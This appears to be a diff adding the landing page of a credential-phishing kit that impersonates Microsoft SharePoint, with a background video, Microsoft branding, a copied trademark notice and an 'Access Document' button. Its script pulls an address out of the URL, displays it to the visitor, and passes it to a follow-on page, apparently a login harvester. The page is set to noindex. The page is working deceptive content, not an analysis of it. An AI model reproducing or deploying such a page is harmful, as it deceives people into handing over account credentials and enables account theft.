@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <title>Sharepoint</title>
+
+    <meta name="description" content="_Materials">
+
+
+
+    <meta name="keywords" content="_Demands">
+
+    <meta name="robots" content="noindex, nofollow">
+
+    <meta property="og:title" content="_Overview | Specs">
+
+    <meta property="og:type" content="website">
+
+    <meta property="og:site_name" content="_&amp;Requirements">
+
+    <meta property="og:description" content="&amp;RFQ_">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="bootstrap.css">
+    <script src="jquery.js"></script>
+
+
+    <script src="popper.js"></script>
+    <script src="bootstrap.js"></script>
+    <style>
+        video {
+            object-fit: cover;
+            width: 100vw;
+            height: 100vh;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- <nav class="navbar bg-white">
+        <div class="container">
+            <a class="navbar-brand" href="#"><img src="logo.jpg"></a>
+            <button class="navbar-toggler " type="button ">
+      <span class="navbar-toggler-icon text-dark"></span>
+    </button>
+
+        </div>
+    </nav> -->
+    <video playsinline="" autoplay="autoplay" muted="muted" loop="" poster="polina.jpg" id="bgvid">
+    <source src="vd.mp4" type="video/webm">
+    <source src="vd.txt" type="video/mp4">
+  </video>
+
+    <div class="container">
+        <div class="d-flex justify-content-center">
+
+
+            <div class="col-sm-8 my-4 text-center" style="background: black; opacity: 0.7;">
+                <div class="my-4"> <img src="lg.png"></div>
+                <span class="text-white" style="font-size: 42px;font-weight: 100;"> Welcome to Microsoft </span>
+                <span class="text-white" style="font-size: 42px;font-weight: 900;">SharePoint</span>
+                <div style="color:white; font-size: 15px;">
+                    Save your files and photos to OneDrive and get them from any device, anywhere
+                </div>
+                <div class="">
+                    <h5 class="text-white" id="x1"></h5>
+                    <button class="btn btn-primary">Access Document</button>
+
+                </div>
+
+                <div class="my-5 text-white" style="font-size: 12px;">
+                    Office365, Outlook, SharePoint, OneDrive, Skype, 
+OneNote, PowerPoint, Word, Excel are all trademarks of Microsoft. All 
+rights reserved © Microsoft 2020.
+                </div>
+            </div>
+            <script>
+                $(document).ready(function() {
+                    let r = (Math.random() + 1).toString(36).substring('hash');
+                    var baseUrl = (window.location).href;
+                    var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
+                    $("#x1").html(url);
+                    $('button').click(function() {
+                        window.location.href = `index-2.html?${r}=${url}`;
+                    });
+                });
+            </script>
+
+        </div>
+    </div>
+
+
+
+</body></html>
